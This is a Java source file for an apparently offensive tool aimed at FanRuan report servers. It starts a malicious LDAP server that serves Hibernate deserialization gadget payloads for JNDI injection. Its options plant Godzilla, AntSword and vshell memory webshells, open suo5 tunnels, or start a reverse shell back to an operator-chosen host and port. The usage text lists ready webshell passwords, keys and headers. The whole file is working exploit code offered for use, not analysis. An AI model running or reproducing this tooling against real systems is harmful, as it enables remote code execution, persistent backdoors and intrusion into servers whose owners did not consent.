package com.example.frchannel;


import com.example.frchannel.payload.*;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;

import java.lang.reflect.Modifier;
import java.net.InetAddress;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

public class HookLdapServer {
    private static final String LDAP_BASE = "dc=example,dc=com";
    private static final String[] classnames= {"tomcatecho", "godzilla_mem", "suo5","vshell","antsword","suo5jsp","godzillajsp"};
    private static String s = utils.reandstr(5) + ".jsp";
    public static void main ( String[] args) throws Exception{
        if (args.length == 2) {
            String port = args[0];
            String command = args[1];
            if (command.startsWith("CLASS:")) {
                String classname = command.trim().substring(6);
                if (Arrays.asList(classnames).contains(classname)) {
                    byte[] bytes = getPayload(classname);
                    start(bytes, Integer.parseInt(port));
                }else {
                    System.err.println("classname not in "+Arrays.asList(classnames) );
                }
            }else  if (command.startsWith("resershell:")) {
                String ipport = command.trim().substring(11);
                String[] parts = ipport.split("#");
                String rhost = parts[0];
                String rport = parts[1];
                ClassPool pool = ClassPool.getDefault();
                CtClass ctClass = pool.get(reservershell.class.getName());
                ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
                ctClass.makeClassInitializer().setBody("start(\""+rhost+"\",\""+rport+"\");");
                byte[] bytes = HibernateWhithFanruan.getpayload(ctClass.toBytecode());
                start(bytes, Integer.parseInt(port));
            }else if (command.trim().startsWith("FILE:")) {
                byte[] data = Files.readAllBytes(Paths.get(command.substring(5)));
                start(data, Integer.parseInt(port));
            }
        } else {
            printUsage();
            System.exit(-1);
        }
    }
    public static void start(byte[] data,int port) throws Exception{
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                new Integer(port),
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(new String[]{"http://127.0.0.1:8081/#Start"}[0]),data));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        String gettime = utils.gettime();
        System.err.println(gettime +" [LdapServer] >> Listening on 0.0.0.0:" + port); //$NON-NLS-1$
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;
        private byte[] b;

        public OperationInterceptor(URL cb, byte[] b) {
            this.codebase = cb;
            this.b = b;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e, b);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        private void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e, byte[] main) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaSerializedData",main);

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

    public static byte[] getPayload(String chain) throws Exception {
        if (chain.equals("tomcatecho")){
            byte[] bytes = utils.getClassByteCode(TomcatEcho.class.getName());
            return HibernateWhithFanruan.getpayload(bytes);
        } else if (chain.equals("godzilla_mem")) {
            byte[] bytes = utils.getClassByteCode(ReportUtil.class.getName());
            return HibernateWhithFanruan.getpayload(bytes);
        } else if (chain.equals("suo5")) {
            byte[] bytes = utils.getClassByteCode(ThreadUtil.class.getName());
            return HibernateWhithFanruan.getpayload(bytes);
        }else if (chain.equals("vshell")) {
            byte[] bytes = utils.getClassByteCode(vshell.class.getName());
            return HibernateWhithFanruan.getpayload(bytes);
        }else if (chain.equals("antsword")) {
            byte[] bytes = utils.getClassByteCode(antsword.class.getName());
            return HibernateWhithFanruan.getpayload(bytes);
        }else if (chain.equals("suo5jsp")) {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.get(suo5jsp.class.getName());
            return HibernateWhithFanruan.getpayload(ctClass.toBytecode());
        }else if (chain.equals("godzillajsp")) {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.get(godzillajsp.class.getName());
            return HibernateWhithFanruan.getpayload(ctClass.toBytecode());
        }else{
            return null;
        }
    }
    public static void printUsage() throws Exception{
        System.err.println(HookLdapServer.class.getName() + " <port> <CLASS:classname>/<resershell:ip#port>/<FILE:filepath>");
        System.err.println("classname:\n\ntomcatecho (head头 Etags: base64enc(Command)) \n\ngodzilla_mem    加密器: JAVA_AES_BASE64 密码: Hwtfhlitg 密钥: Loklewkvqbo 请求路径: /* 请求头: User-Agent: Orjuagk\nsuo5    (suo5 -d -l 0.0.0.0:7788 --auth test:test123 --ua 'Nuexq' -t http(s)://ip:port/webroot/decision) \n\nanstword  类型：jspjs 密码: b\n\n"+"suo5jsp: suo5 -t http://10.211.55.2:8075/webroot/suo5.jsp\n\n"+
         "vshell(agent): 加密器: JAVA_AES_BASE64 密码: Iddzfpe 密钥: Septtdzjura 请求路径: /* 请求头: Referer: Aiskhs 脚本类型: JSP\n\n"+"godzillajsp: 加密器: JAVA_AES_BASE64 密码: fine 密钥: ldapc 请求路径: /*");
    }
}